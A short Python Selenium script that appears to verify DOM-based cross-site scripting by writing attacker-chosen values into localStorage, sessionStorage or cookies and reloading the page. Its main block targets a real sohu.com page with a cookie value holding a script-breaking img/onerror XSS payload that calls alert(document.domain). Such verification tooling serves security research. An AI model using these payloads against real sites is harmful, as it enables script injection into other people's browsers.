from selenium import webdriver
# from selenium.webdriver.chrome.options import Options
from selenium.webdriver.firefox.options import Options

from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, WebDriverException
from setstorage import *

def dcheck(domain, source_type, key, value):
    if not len(key) or not len(value):
        return -1
    options = Options()
    # options.binary_location = root_path + "chrome"
    # options.binary_location = root_path + "out/Bytecode/chrome"
    options.add_argument("--no-sandbox")
    # options.headless = True
    with webdriver.Firefox(options=options, executable_path="/media/data1/zfk/geckodriver") as driver:

        url = domain #'http://' + 
        try:
            driver.set_page_load_timeout(30)
            driver.get(url)
        
            if 'localStorage' in source_type:
                # set the local storage
                localstorage = LocalStorage(driver)
                localstorage[key] = value
                driver.refresh()
            elif 'sessionStorage' in source_type: 
                sessionstorage = SessionStorage(driver)
                sessionstorage[key] = value
                driver.refresh()
            elif 'cookie' in source_type:
                # set cookie
                # driver.add_cookie({"name": key, "value": value})
                # driver.refresh()
                new_cookie = Cookies(driver)
                new_cookie.change_cookie(key, value)
                if not driver.get_cookie(key):
                    print url, source_type, key, value, "cookie not set! "
                driver.refresh()
                if not driver.get_cookie(key):
                    print url, source_type, key, value, "cookie not set after refresh! "
            elif 'url' in source_type or 'URL' in source_type:
                # try:
                driver.get(value)
                # except Exception as e: #(TimeoutException, WebDriverException)
                #     print url, 'has exception: ',  e
                #     return 'NotLoaded'
            else:
                print url + ' has source_type: ' + source_type
                return 'UnsupportedType'

        except Exception as e: #(TimeoutException, WebDriverException)
            print url, 'has exception: '
            print e
            return 'NotLoaded'


if __name__ == "__main__":
    url = "http://images.sohu.com/bill/jingzhun/2017/baidu/juxinggengxin.html"
    cookie_key = 'vuid'
    cookie_value = 'pl346262568.1222667869</script><img src=foo onerror=alert(document.domain) onload=alert(document.domain)><textarea>'
    dcheck(url, 'cookie', cookie_key, cookie_value)